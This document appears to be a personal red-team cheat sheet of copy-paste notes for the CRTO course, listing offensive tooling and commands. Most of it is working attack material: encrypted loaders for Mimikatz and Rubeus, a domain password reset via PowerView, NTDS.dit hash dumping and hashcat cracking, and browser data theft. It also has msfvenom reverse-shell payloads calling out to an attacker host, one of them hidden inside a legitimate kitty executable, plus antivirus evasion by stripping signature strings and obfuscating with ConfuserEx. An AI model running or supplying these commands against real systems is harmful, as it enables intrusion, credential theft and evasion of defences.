# CRTO_Notes
Collection of red team things used for CRTO that might be useful
https://www.zeropointsecurity.co.uk/red-team-ops

Mix of homebrew / others tooling, very much a curated collection of references to copy and paste.


Fucking great ippsec like dashlane search 
https://vysecurity.rocks/?#


Poggy simple sig based evasion
https://luemmelsec.github.io/Circumventing-Countermeasures-In-AD/


***
SharpLoader
https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader

```powershell
Invoke-SharpEncrypt -file C:\CSharpFiles\SafetyKatz.exe -password S3cur3Th1sSh1t -outfile C:\CSharpEncrypted\SafetyKatz.enc
```
```powershell
Invoke-SharpLoader -location C:\EncryptedCSharp\Rubeus.enc -password S3cur3Th1sSh1t -argument kerberoast -argument2 "/format:hashcat"
```

***
```powershell
Import-Module .\PowerView.ps1
$Username = 'p00_adm'
$Password = 'ZQ!5t4r'
$pass = ConvertTo-SecureString -AsPlainText $Password -Force
$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList
$Username,$pass
Set-DomainUserPassword -Identity mr3ks -Password $pass -Credential $Cred
```
***

#https://www.dsinternals.com/en/
#https://attack.stealthbits.com/ntds-dit-security-active-directory

```powershell
Compress-Archive -Path C:\Users\Public\Downloads\poon -DestinationPath C:\Users\Public\Downloads\poon.zip
```


#Install-Module DSInternals -Force

```powershell
Import-Module DSInternals
$Key = Get-BootKey -SystemHiveFilePath C:\Users\p4yl0ad\Desktop\AD\poon\registry\SYSTEM
 
Get-ADDBAccount -BootKey $Key -DatabasePath 'C:\Users\p4yl0ad\Desktop\AD\poon\Active Directory\ntds.dit' -All |
  Format-Custom -View HashcatNT | 
  Out-File C:\Users\p4yl0ad\Desktop\AD\poon\Hashdump.txt
 ```
hashcat -m 1000 -a 0 Hashdump.txt -o Cracked.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

hashcat -m 1000 -a 0 Hashdump.txt -o Cracked-otrta.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/otrta.rule

hashcat -m 1000 -a 3 --custom-charset1=?l?d?u --username -o cracked.txt .\Hashdump.txt ?1?1?1?1?1?1?1?1


**Ran out of options:**
```
hashcat -m 13100 -a 0 --outfile hashnamecracked.txt hash.txt /opt/SecLists/Passwords/*.txt --force -r
/usr/share/hashcat/rules/best64.rule
```


***



****
Shortcut with powershell
```
$TargetFile = "$env:SystemRoot\System32\calc.exe"
$ShortcutFile = "C:\experiments\cpl\calc.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$Shortcut.TargetPath = $TargetFile
$Shortcut.Save()
```

****

https://offensivedefence.co.uk/posts/covenant-profiles-templates/

```csharp
//stager mods
public static string GetMessageFormat
{
         get
         {
                  var sb = new StringBuilder(@"{{""GUID"":""{0}"",");
                  sb.Append(@"""Type"":{1},");
                  sb.Append(@"""Meta"":""{2}"",");
                  sb.Append(@"""IV"":""{3}"",");
                  sb.Append(@"""EncryptedMessage"":""{4}"",");
                  sb.Append(@"""HMAC"":""{5}""}}");
                  return sb.ToString();
         }
}
                  
//then                  
string MessageFormat = GetMessageFormat;
```

```csharp
//executor mods
private static string EncryptedMessageFormat
{
         get
         {
                  var sb = new StringBuilder(@"{{""GUID"":""{0}"",");
                  sb.Append(@"""Type"":{1},");
                  sb.Append(@"""Meta"":""{2}"",");
                  sb.Append(@"""IV"":""{3}"",");
                  sb.Append(@"""EncryptedMessage"":""{4}"",");
                  sb.Append(@"""HMAC"":""{5}""}}");
                  return sb.ToString();
         }
}
//then
private static string GruntEncryptedMessageFormat = EncryptedMessageFormat;

```






****

Browser D33ts:
https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
```
(crto_cov) > powershell Get-BrowserData -Browser All

Cannot find path 'C:\Users\p4yl0ad\AppData\Local\Google\Chrome\User Data\Default\History' because it does not exist.


Browser User  DataType Data                                                                               
------- ----  -------- ----                                                                              
IE      p4yl0ad History  https://p4yl0ad.github.io/                                                     
IE      p4yl0ad History  https://p4yl0ad.github.io/                                                              
IE      p4yl0ad History  https://p4yl0ad.github.io/

```



****

exe
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=443 --arch x64 --platform windows --encoder x64/xor_dynamic --encrypt-iv --encrypt
rc4 --encrypt-key neoncatkeysignature --iterations 60 --timeout 10 -b '\x00' -n 22 -x kitty-0.74.4.11.exe -f exe > neoncat1.exe
```

Encrypting C# shellcode
```
msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.152.100 LPORT=80 -f csharp --encrypt aes256 --encrypt-key 12345678901234567890123456789012 --encrypt-iv 1234567890123456
```

generate a csharp bytearray with msf

`msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.152.100 LPORT=80 -f csharp -o reverse-tcp.txt`
`msfvenom --platform windows -p windows/x64/exec CMD='cmd.exe /c start calc.exe' -f powershell`


Utilize Simple Loader to create an encoded b64 string and insert into the loader
`git clone https://github.com/cribdragg3r/Simple-Loader.git`

```C:\Tools>C:\Tools\Simple-Loader\Simple-Loader\bin\Debug\Simple-Loader.exe reverse-tcp.txt
[i] Encrypting Data
[i] Replace the hiphop variable with your new payload:

         String hiphop = "ZxOy1Bks+Vfrlq8wcmyHY8GwwiBZd8NGrGQiKvx15hcv9sQ9apoO6NGbNBxAeS4NLHSz4owcdPgQTTejYJr80Ke4ynoy41yrc5R+D0uqt1ppyxDAeYGATQy7xFbN247gwFee5cPZAFyBzbI6DvOLBFSJiP6+4kv5T7pX3iapVsX7ORmg7Ubfa1M9P/cYNm5qzS9dyHxFde/D578YA6DGYC0/UPzmeDXB11R0MWmPAkRGFftQp+YdurMHce1R4HC9bdCXIO3fdx7Gjy/pDwzh9eMtApiQa1B0Y7ZcEWj0LLHwl0kvAodjTX+M+tQJrsFmA53OcwzDlzlVD6YFXP9uOegIOif+bPSKnCXU0aRaY+U7RRr3QbBCfMtwAm1G6bwHrL6q1jeeWeZN+sWxZbCHnW6mNAOGeV/aG8qod5AqhlIXeIGomvKoPs4bxZ2wNEd7";
```

Remove all strings that are trigger words e.g. comments and "shellcode" "meterpreter" etc etc 

Utilize confuserEX to obfuscate the binary generated by the output 
git clone https://github.com/yck1509/ConfuserEx.git


****
DPAPI
```powershell
$exfil = Get-Content -Path C:\Users\Public\Downloads\oof.txt | ConvertTo-SecureString ; [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR((($exfil))))

Import-Module .\FileCryptography.psm1
$key = 'AhXpFs[...REDACTED...]LxlUqc0Y='
Unprotect-File .\exfil.txt.AES AES $key
```
****


**Byte array for combo with shellc loader**
```powershell
$bytes = [System.IO.File]::ReadAllBytes("Grunt.bin");
$bytes -join ","
```

****

Current Users SID no whoami /all:
cmd.exe /c wmic useraccount where name='%username%' get sid
Covenant:
shellcmd wmic useraccount where name='%username%' get sid



SI 0 -> SI >=1
https://github.com/antonioCoco/RunasCs


*****

`[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi"))`


```
$Username="Hugo"
$Password="abcdefgh"
$WebProxy = New-Object System.Net.WebProxy("http://webproxy:8080",$true)
$url="http://aaa.bbb.ccc.ddd/rss.xml"

$WebClient = New-Object net.webclient

$WebClient.Proxy=$webproxy
$WebClient.proxy.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
$path="C:\Users\hugo\xml\test.xml"
$WebClient.DownloadFile($url, $path)

```

